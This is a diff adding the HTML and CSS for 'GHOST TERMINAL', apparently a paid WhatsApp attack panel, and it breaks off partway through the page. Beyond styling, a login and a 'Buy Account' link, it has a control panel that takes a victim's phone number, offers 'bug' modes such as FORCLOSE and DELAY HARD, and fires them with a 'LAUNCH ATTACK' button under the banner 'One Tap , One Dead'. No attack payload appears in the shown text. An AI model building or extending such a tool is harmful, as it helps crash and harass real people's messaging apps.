@@ -1,0 +1,1526 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>GHOST TERMINAL</title>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0b1e;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            color: #ffffff;
+            overflow-x: hidden;
+            overflow-y: auto;
+        }
+        body::-webkit-scrollbar { display: none; }
+
+        /* LOGIN PAGE */
+        .login-page {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2000;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+        }
+        .login-page::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
+            z-index: 1;
+        }
+        .login-video-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 0;
+        }
+        .login-page.hide { opacity: 0; visibility: hidden; }
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2;
+            padding: 0 20px;
+        }
+        .card {
+            background: rgba(16, 19, 31, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 32px;
+            border: 1px solid rgba(139, 158, 255, 0.2);
+            padding: 32px 28px 40px;
+        }
+        .avatar-wrapper { display: flex; justify-content: center; margin-bottom: 24px; }
+        .avatar-square {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(145deg, #1e2130, #0f111a);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 2px solid rgba(139, 158, 255, 0.5);
+        }
+        .avatar-square img { width: 100%; height: 100%; object-fit: cover; }
+        .welcome { text-align: center; margin-bottom: 28px; }
+        .welcome h2 { font-size: 26px; font-weight: 700; background: linear-gradient(135deg, #fff, #a0a0c0); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .welcome p { font-size: 13px; color: #8f9eff; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 12px; color: #8b9eff; margin-bottom: 8px; }
+        .input-wrapper {
+            background: rgba(15, 23, 42, 0.8);
+            border: 1px solid rgba(42, 47, 71, 0.8);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            padding: 14px 18px;
+        }
+        .input-wrapper i { color: #8b9eff; }
+        .input-wrapper input {
+            background: transparent;
+            border: none;
+            color: white;
+            width: 100%;
+            font-size: 15px;
+            outline: none;
+            margin-left: 10px;
+        }
+        .char-counter {
+            text-align: right;
+            font-size: 10px;
+            color: #6e7390;
+            margin-top: 4px;
+        }
+        .char-counter.valid { color: #4ade80; }
+        .char-counter.invalid { color: #ef4444; }
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(95deg, #5f7ef2, #3b56c4);
+            border: none;
+            border-radius: 12px;
+            padding: 14px 0;
+            font-size: 16px;
+            font-weight: 700;
+            color: white;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 20px;
+        }
+        .login-btn.disabled { opacity: 0.5; cursor: not-allowed; }
+        .buy-link { text-align: center; margin-top: 16px; }
+        .buy-link a { color: #8f9eff; font-size: 13px; text-decoration: none; }
+
+        /* MAIN APP */
+        .app-wrapper { display: none; opacity: 0; transition: opacity 0.5s; }
+        .app-wrapper.show { display: block; opacity: 1; }
+        .app-container { width: 100%; max-width: 500px; margin: 0 auto; background: #0a0b1e; min-height: 100vh; }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: #0a0b1e;
+            border-bottom: 1px solid #1e293b;
+        }
+        .brand-name {
+            font-weight: bold;
+            font-size: 1.2rem;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #fff, #8b9eff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -280px;
+            width: 280px;
+            height: 100%;
+            background: #0a0b1e;
+            z-index: 1000;
+            transition: 0.3s;
+            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
+        }
+        .sidebar.active { left: 0; }
+        .sidebar-header {
+            background: linear-gradient(to right, #1e40af, #3b82f6);
+            padding: 40px 20px 20px;
+        }
+        .sidebar-header h2 { margin: 0; font-size: 1.5rem; color: white; }
+        .sidebar-user-info p { margin: 5px 0; font-size: 0.9rem; color: #cbd5e1; }
+        .sidebar-menu { padding: 20px; }
+        .menu-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 0;
+            color: white;
+            gap: 15px;
+            border-bottom: 1px solid #1e293b;
+            cursor: pointer;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 999;
+        }
+        .container { padding: 15px; padding-bottom: 80px; }
+        .page { display: none; }
+        .page.active-page { display: block; }
+
+        /* HOME PAGE */
+        .darkverse-home { padding: 10px 0; }
+        .darkverse-header {
+            text-align: center;
+            margin-bottom: 30px;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1), opacity 0.5s ease;
+        }
+        .darkverse-header.animate-in { transform: translateY(0); opacity: 1; }
+        .darkverse-title {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #ffffff, #8b9eff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .darkverse-subtitle { font-size: 11px; color: #6e7390; letter-spacing: 1px; text-transform: uppercase; }
+        .banner-video-card {
+            width: 100%;
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            aspect-ratio: 16 / 7;
+            background-color: #1e293b;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            transform: translateY(20px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1) 0.05s, opacity 0.5s ease 0.05s;
+            position: relative;
+        }
+        .banner-video-card.animate-in { transform: translateY(0); opacity: 1; }
+        .banner-video-card video { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .powered-text {
+            position: absolute;
+            bottom: 12px;
+            left: 16px;
+            font-size: 11px;
+            color: rgba(255,255,255,0.7);
+            background: rgba(0,0,0,0.5);
+            padding: 4px 12px;
+            border-radius: 20px;
+            backdrop-filter: blur(4px);
+            font-family: monospace;
+            letter-spacing: 0.5px;
+            z-index: 2;
+            pointer-events: none;
+        }
+        .action-card {
+            background: #0f1222;
+            border-radius: 20px;
+            padding: 16px 20px;
+            margin-bottom: 20px;
+            border: 1px solid #252c3e;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1) 0.1s, opacity 0.5s ease 0.1s;
+            background-color: #0f1222;
+            position: relative;
+        }
+        .action-card.animate-in { transform: translateY(0); opacity: 1; }
+        .action-left { display: flex; align-items: center; gap: 15px; }
+        .action-icon {
+            width: 48px; height: 48px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .action-text h4 { font-size: 16px; font-weight: 700; color: white; }
+        .action-text p { font-size: 11px; color: #8b9eff; }
+        .action-arrow { color: #8b9eff; }
+
+        /* WHATSAPP PAGE */
+        .profile-card {
+            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
+            border-radius: 15px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            transform: translateY(30px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1), opacity 0.5s ease;
+        }
+        .profile-card.animate-in { transform: translateY(0); opacity: 1; }
+        .profile-card .user-section { display: flex; align-items: center; gap: 12px; }
+        .profile-card .avatar {
+            width: 50px; height: 50px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: transparent;
+        }
+        .profile-card .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .profile-card .badge { font-size: 10px; background: rgba(255,255,255,0.2); padding: 2px 8px; border-radius: 20px; display: inline-block; }
+        .banner-video {
+            width: 100%;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            aspect-ratio: 16/9;
+            transform: translateY(30px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1) 0.1s, opacity 0.5s ease 0.1s;
+            position: relative;
+        }
+        .banner-video.animate-in { transform: translateY(0); opacity: 1; }
+        .banner-video video { width: 100%; height: 100%; object-fit: cover; }
+        .banner-text {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-weight: bold;
+            background: rgba(0,0,0,0.5);
+            padding: 5px 12px;
+            border-radius: 20px;
+        }
+        .control-panel {
+            background: #161b33;
+            border-radius: 15px;
+            padding: 20px;
+            transform: translateY(30px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1) 0.2s, opacity 0.5s ease 0.2s;
+        }
+        .control-panel.animate-in { transform: translateY(0); opacity: 1; }
+        .input-wrapper-cp {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            padding: 12px;
+        }
+        input, select {
+            background: transparent;
+            border: none;
+            color: white;
+            width: 100%;
+            outline: none;
+            padding-left: 10px;
+            font-size: 14px;
+        }
+        .btn-send {
+            width: 100%;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-send:hover { opacity: 0.9; transform: scale(0.98); background: #2563eb; }
+
+        /* SPLASH LOADING - RECTANGLE (16:9) DURATION 17 DETIK */
+        .splash-loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.6s ease;
+            overflow: hidden;
+        }
+        .splash-loading.hide { opacity: 0; pointer-events: none; }
+        .splash-bg-video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 0;
+            filter: blur(8px) brightness(0.5);
+        }
+        .splash-video-container {
+            width: 85%;
+            max-width: 400px;
+            aspect-ratio: 16 / 9;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #0a0a0a;
+            box-shadow: 0 0 20px rgba(255,255,255,0.1);
+            position: relative;
+            z-index: 1;
+        }
+        .splash-video-container video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .splash-text {
+            margin-top: 20px;
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            font-size: 1.1rem;
+            letter-spacing: 2px;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(120,120,120,0.5);
+            position: relative;
+            z-index: 1;
+        }
+        .loading-dots {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+            position: relative;
+            z-index: 1;
+        }
+        .loading-dots span {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: white;
+            opacity: 0.2;
+            animation: blinkGhost 1s infinite;
+        }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+        @keyframes blinkGhost {
+            0%, 80%, 100% { opacity: 0.2; transform: translateY(0); }
+            40% { opacity: 1; transform: translateY(-4px); }
+        }
+
+        /* SUCCESS MODAL */
+        .success-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(8px);
+            z-index: 11000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeInModal 0.3s ease;
+        }
+        .success-modal.show { display: flex; }
+        @keyframes fadeInModal {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .success-card {
+            background: linear-gradient(135deg, #0f1222, #0a0c18);
+            border-radius: 32px;
+            border: 1px solid #00ff88;
+            padding: 40px 32px;
+            text-align: center;
+            max-width: 320px;
+            width: 85%;
+            box-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
+            animation: slideUp 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #00ff8820;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            border: 2px solid #00ff88;
+        }
+        .success-icon svg {
+            width: 36px;
+            height: 36px;
+            stroke: #00ff88;
+        }
+        .success-card h3 {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 8px;
+        }
+        .success-card p {
+            font-size: 14px;
+            color: #8b9eff;
+            margin-bottom: 16px;
+        }
+        .success-detail {
+            background: #1a1e30;
+            border-radius: 16px;
+            padding: 12px;
+            margin: 16px 0;
+            font-family: monospace;
+            font-size: 12px;
+            color: #00ff88;
+            word-break: break-all;
+        }
+        .success-card button {
+            background: linear-gradient(95deg, #00ff88, #00cc66);
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            color: #000;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        /* INFO PAGE */
+        .info-dark-container {
+            background: #0a0c14;
+            border-radius: 24px;
+            overflow: hidden;
+            transform: translateY(30px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1), opacity 0.5s ease;
+        }
+        .info-dark-container.animate-in { transform: translateY(0); opacity: 1; }
+        .premium-header { background: #06070c; padding: 32px 28px 22px; border-bottom: 1px solid #1b212e; }
+        .brand { display: flex; align-items: baseline; justify-content: space-between; flex-wrap: wrap; gap: 14px; }
+        .brand h1 { font-size: 30px; font-weight: 800; background: linear-gradient(130deg, #FFFFFF 20%, #B91C1C 85%); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .sys-tag { font-family: monospace; background: #0f111c; padding: 6px 14px; border-radius: 100px; font-size: 11px; color: #3bff8c; border: 0.5px solid #2b3245; }
+        .sub-header { display: flex; justify-content: space-between; margin-top: 14px; }
+        .eula-text { font-size: 13px; color: #8f99b0; }
+        .custom-divider { height: 2px; background: linear-gradient(90deg, #B91C1C, #2a2f40, #0a0c14); width: 100%; margin: 8px 0 0; }
+        .rules-area { padding: 28px 26px 20px; }
+        .rule-block { margin-bottom: 38px; }
+        .rule-header { display: flex; align-items: center; gap: 12px; margin-bottom: 18px; border-left: 3px solid #B91C1C; padding-left: 16px; }
+        .custom-logo { width: 28px; height: 28px; background: #141824; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 14px; color: #B91C1C; border: 0.5px solid #2f3548; }
+        .rule-header h3 { font-size: 18px; font-weight: 700; color: #f0f2fa; }
+        .rule-card-custom { background: #07090f; border-radius: 24px; padding: 18px 22px; margin-bottom: 16px; border: 1px solid #181e2c; }
+        .rule-title-line { display: flex; align-items: center; gap: 12px; margin-bottom: 10px; }
+        .mini-symbol { font-family: monospace; font-weight: 700; font-size: 16px; color: #B91C1C; background: #11131f; width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; border-radius: 8px; }
+        .rule-name { font-weight: 700; font-size: 16px; color: #e2e8ff; }
+        .rule-desc { font-size: 13.5px; line-height: 1.48; color: #949cb3; margin-left: 38px; }
+        .rule-desc strong { color: #dc3c3c; }
+        .inline-badge { background: #11141f; font-size: 10px; padding: 2px 10px; border-radius: 50px; color: #B91C1C; margin-left: 10px; border: 0.2px solid #2d3348; }
+        .footer-legal { font-size: 9.5px; text-align: center; color: #3e4357; border-top: 1px solid #121724; padding: 20px 24px 22px; }
+        .brand-icon-custom { display: flex; align-items: center; gap: 10px; }
+        .dv-logo { width: 34px; height: 34px; background: #B91C1C10; border-radius: 14px; border: 1px solid #B91C1C40; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 16px; color: #B91C1C; }
+
+        /* TOOLS PAGE */
+        .tools-dark-container {
+            background: #0a0c14;
+            border-radius: 24px;
+            overflow: hidden;
+            transform: translateY(30px);
+            opacity: 0;
+            transition: transform 0.5s cubic-bezier(0.2, 0.9, 0.4, 1.1), opacity 0.5s ease;
+        }
+        .tools-dark-container.animate-in { transform: translateY(0); opacity: 1; }
+        .tools-area { padding: 20px 20px 24px; }
+        .tool-category {
+            margin-bottom: 12px;
+            border-radius: 20px;
+            overflow: hidden;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .main-btn {
+            width: 100%;
+            background: rgba(15, 23, 42, 0.8);
+            padding: 16px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.15s ease;
+            border: none;
+            color: #eef2ff;
+            font-family: inherit;
+        }
+        .btn-left { display: flex; align-items: center; gap: 14px; }
+        .custom-icon {
+            width: 40px; height: 40px;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            color: #3b82f6;
+            border: 0.5px solid rgba(59, 130, 246, 0.3);
+        }
+        .btn-text { font-weight: 700; font-size: 16px; }
+        .btn-desc { font-size: 11px; color: #64748b; margin-top: 2px; }
+        .arrow { font-size: 14px; color: #64748b; transition: transform 0.2s; }
+        .arrow.open { transform: rotate(180deg); }
+        .submenu {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background: rgba(8, 12, 22, 0.9);
+            border-top: 1px solid rgba(59, 130, 246, 0.15);
+        }
+        .submenu.show { max-height: 500px; transition: max-height 0.4s ease-in; }
+        .sub-buttons { padding: 16px 20px; display: flex; flex-wrap: wrap; gap: 12px; }
+        .sub-btn {
+            background: rgba(30, 41, 59, 0.8);
+            border: 0.5px solid rgba(59, 130, 246, 0.3);
+            border-radius: 40px;
+            padding: 8px 18px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #cbd5e1;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        .trigger-quick-btn {
+            width: 100%;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 20px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            color: #60a5fa;
+            font-weight: 600;
+        }
+        .quick-section {
+            margin-top: 24px;
+            background: rgba(15, 23, 42, 0.5);
+            border-radius: 24px;
+            padding: 18px 20px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+            display: none;
+        }
+        .quick-section.show { display: block; }
+        .quick-item {
+            background: #1e293b;
+            padding: 8px 16px;
+            border-radius: 40px;
+            border: none;
+            color: #cbd5e1;
+            cursor: pointer;
+            margin: 4px;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            max-width: 500px;
+            background: #0a0b1e;
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0 20px;
+            border-top: 1px solid #1e293b;
+            z-index: 100;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; font-size: 0.7rem; color: #94a3b8; cursor: pointer; }
+        .nav-item.active { color: #3b82f6; }
+        .bottom-spacer { height: 80px; }
+        .toast-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; width: 80%; max-width: 300px; }
+        .toast { background: #ef4444; color: white; padding: 12px 20px; border-radius: 8px; text-align: center; margin-bottom: 10px; }
+        .toast.success { background: #10b981; }
+        .clickable { cursor: pointer; }
+        
+        /* MODAL untuk tools */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s, visibility 0.2s;
+        }
+        .modal-overlay.show { opacity: 1; visibility: visible; }
+        .modal-card {
+            width: 90%;
+            max-width: 500px;
+            background: #0f111a;
+            border: 2px solid #3b82f6;
+            border-radius: 28px;
+            overflow: hidden;
+        }
+        .modal-header { background: #080c1a; padding: 20px 24px; border-bottom: 1px solid #3b82f6; }
+        .modal-header h3 { font-size: 22px; font-weight: 800; color: #e0e0ff; }
+        .modal-body { padding: 24px; background: #0a0e18; }
+        .modal-body input, .modal-body textarea {
+            width: 100%;
+            background: #03050b;
+            border: 1px solid #2c2e3c;
+            padding: 12px 14px;
+            color: #e0e0e0;
+            font-family: monospace;
+            font-size: 13px;
+            margin: 10px 0;
+            border-radius: 12px;
+        }
+        .modal-body label { font-size: 11px; color: #8f9bff; text-transform: uppercase; }
+        .modal-body button {
+            background: #0c0e18;
+            border: 1.5px solid #323544;
+            color: #cdd6ff;
+            font-weight: bold;
+            padding: 10px 20px;
+            margin-top: 12px;
+            cursor: pointer;
+            border-radius: 40px;
+            width: 100%;
+        }
+        .status-log { background: #010101; padding: 12px; font-size: 11px; color: #6f8f6f; font-family: monospace; margin-top: 16px; border-left: 3px solid #3b82f6; }
+        .close-modal-btn { background: #1f2937; margin-top: 12px; }
+        
+        /* PROFILE MODAL */
+        .profile-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 4000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s;
+        }
+        .profile-modal.show { opacity: 1; visibility: visible; }
+        .profile-modal .modal-card {
+            max-width: 560px;
+            overflow-y: auto;
+            max-height: 90vh;
+        }
+        
+        /* DEV PAGE MODAL */
+        .dev-page-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            backdrop-filter: blur(12px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 5000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s;
+        }
+        .dev-page-modal.show { opacity: 1; visibility: visible; }
+        
+        /* bug options container - muncul saat select diklik */
+        .bug-options-container {
+            display: block;
+            gap: 10px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+            max-height: 0;
+            opacity: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease, opacity 0.3s ease, margin 0.3s ease;
+        }
+        .bug-options-container.show {
+            max-height: 200px;
+            opacity: 1;
+            margin-top: 12px;
+        }
+        .bug-option {
+            background: #1e293b;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 11px;
+            cursor: pointer;
+            transition: 0.1s;
+            color: #cbd5e1;
+            display: inline-block;
+            margin: 4px 6px 4px 0;
+        }
+        .bug-option:hover {
+            background: #3b82f6;
+            color: white;
+        }
+        .select-wrapper {
+            position: relative;
+            cursor: pointer;
+        }
+        .custom-select-trigger {
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 12px;
+            cursor: pointer;
+        }
+        .custom-select-trigger span {
+            color: white;
+            font-size: 14px;
+        }
+        .custom-select-trigger i {
+            color: #8b9eff;
+            transition: transform 0.2s;
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOGIN PAGE -->
+<div class="login-page" id="loginPage">
+    <video class="login-video-bg" autoplay loop muted playsinline>
+        <source src="https://c.termai.cc/v136/1zrQ.mp4" type="video/mp4">
+    </video>
+    <div class="login-container">
+        <div class="card">
+            <div class="avatar-wrapper"><div class="avatar-square"><img src="https://c.termai.cc/i160/fkb.jpg" alt="Profile"></div></div>
+            <div class="welcome"><h2>Welcome Back</h2><p>Login to continue</p></div>
+            <div class="input-group"><label>Username</label><div class="input-wrapper"><i data-lucide="user" size="18"></i><input type="text" id="loginUsername" placeholder="Enter username"></div><div class="char-counter" id="usernameCounter">0/8</div></div>
+            <div class="input-group"><label>Password</label><div class="input-wrapper"><i data-lucide="lock" size="18"></i><input type="password" id="loginPassword" placeholder="Enter password"></div><div class="char-counter" id="passwordCounter">0/8</div></div>
+            <button class="login-btn" id="loginBtn">LOGIN</button>
+            <div class="buy-link"><a href="#" id="buyLink">Buy Account</a></div>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN APP -->
+<div class="app-wrapper" id="appWrapper">
+    <div class="overlay" id="overlay" onclick="toggleMenu()"></div>
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header"><h2>GHOST TERMINAL</h2><div class="sidebar-user-info"><p>User: <span id="sidebarUsername">UNKNOW</span></p><p>Role: <span id="sidebarRole">MEMBER</span></p><p>Expired: Lifetime</p></div></div>
+        <div class="sidebar-menu">
+            <div class="menu-item" id="devPageBtn" style="display:none;"><i data-lucide="shopping-cart"></i> Dev Page</div>
+            <div class="menu-item" id="profileMenuBtn"><i data-lucide="user-circle"></i> Profile</div>
+            <div class="menu-item" id="logoutBtn"><i data-lucide="log-out"></i> Logout</div>
+        </div>
+    </div>
+    <div class="app-container">
+        <header><i data-lucide="menu" onclick="toggleMenu()" style="cursor:pointer"></i><div class="brand-name">GHOST TERMINAL</div><div style="display:flex; gap:15px"><i data-lucide="bell" class="clickable" id="bellIcon"></i><i data-lucide="user-circle" id="profileIcon" style="cursor:pointer"></i></div></header>
+        <div class="container">
+            <!-- HOME PAGE -->
+            <div id="pageHome" class="page active-page">
+                <div class="darkverse-home">
+                    <div class="darkverse-header" id="homeHeader"><div class="darkverse-title">WELCOME</div><div class="darkverse-subtitle">Buy Access Chat Accounts Gilexs8</div></div>
+                    <div class="banner-video-card" id="homeVideoContainer">
+                        <video id="homeVideo" loop muted playsinline><source src="https://c.termai.cc/v142/uQgLEe.mp4" type="video/mp4"></video>
+                        <div class="powered-text">powered by gilexs8</div>
+                    </div>
+                    <div class="action-card" id="channelWhatsappBtn" style="background-color:#0f1222; background-image:none;">
+                        <div class="action-left"><div class="action-icon buy"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="1.5"><path d="M12 2L2 7L12 12L22 7L12 2Z"/><path d="M2 17L12 22L22 17"/><path d="M2 12L12 17L22 12"/><circle cx="12" cy="12" r="2" fill="#3b82f6" stroke="none"/></svg></div><div class="action-text"><h4>CHANNEL WHATSAPP</h4><p></p></div></div><div class="action-arrow"><i data-lucide="chevron-right" size="20"></i></div>
+                    </div>
+                </div>
+                <div class="bottom-spacer"></div>
+            </div>
+            
+            <!-- WHATSAPP PAGE -->
+            <div id="pageWhatsApp" class="page">
+                <div class="profile-card" id="waProfileCard">
+                    <div class="user-section"><div class="avatar"><img src="https://c.termai.cc/i137/yjC.jpeg" alt="avatar" id="waAvatar"></div><div><div style="font-weight:bold" id="waUsername">UNKNOW</div><div class="badge" id="waRoleBadge">MEMBER</div></div></div>
+                    <div style="text-align:right;font-size:0.7rem">EXPIRES<br><b>2028-12-25</b></div>
+                </div>
+                <div class="banner-video" id="waVideoContainer"><video id="waVideo" loop muted playsinline><source src="https://c.termai.cc/v123/zlJ4.mp4" type="video/mp4"></video><div class="banner-text">One Tap , One Dead</div></div>
+                <div class="control-panel" id="waControlPanel">
+                    <h3>Control Panel</h3>
+                    <div class="input-group"><label>Nomor Target</label><div class="input-wrapper-cp"><i data-lucide="smartphone" size="18"></i><input type="text" id="targetNumber" placeholder="Contoh: +62xxxxxxxxxx"></div></div>
+                    <div class="input-group">
+                        <label>Pilih Bug</label>
+                        <!-- Custom select trigger -->
+                        <div class="select-wrapper">
+                            <div class="custom-select-trigger" id="bugSelectTrigger">
+                                <span id="selectedBugText">Pilih Bug</span>
+                                <i data-lucide="chevron-down" size="18" id="bugSelectArrow"></i>
+                            </div>
+                            <!-- Pilihan bug yang tersembunyi dan muncul saat diklik -->
+                            <div class="bug-options-container" id="bugOptionsContainer">
+                                <div class="bug-option" data-bug="FORCLOSE">FORCLOSE</div>
+                                <div class="bug-option" data-bug="INVIS">INVIS</div>
+                                <div class="bug-option" data-bug="DELAY_INVISIBLE">DELAY INVISIBLE</div>
+                                <div class="bug-option" data-bug="DELAY_HARD">DELAY HARD</div>
+                            </div>
+                        </div>
+                        <input type="hidden" id="bugSelect" value="">
+                    </div>
+                    <button class="btn-send" id="sendBugBtn"><i data-lucide="send"></i> LAUNCH ATTACK</button>
+                    <div id="methodDisplay" style="margin-top:12px; font-size:11px; color:#8b9eff; text-align:center;"></div>
+                </div>
+                <div class="bottom-spacer"></div>
+            </div>
+            
+            <!-- INFO PAGE -->
+            <div id="pageInfo" class="page">
+                <div class="info-dark-container" id="infoDarkContainer">
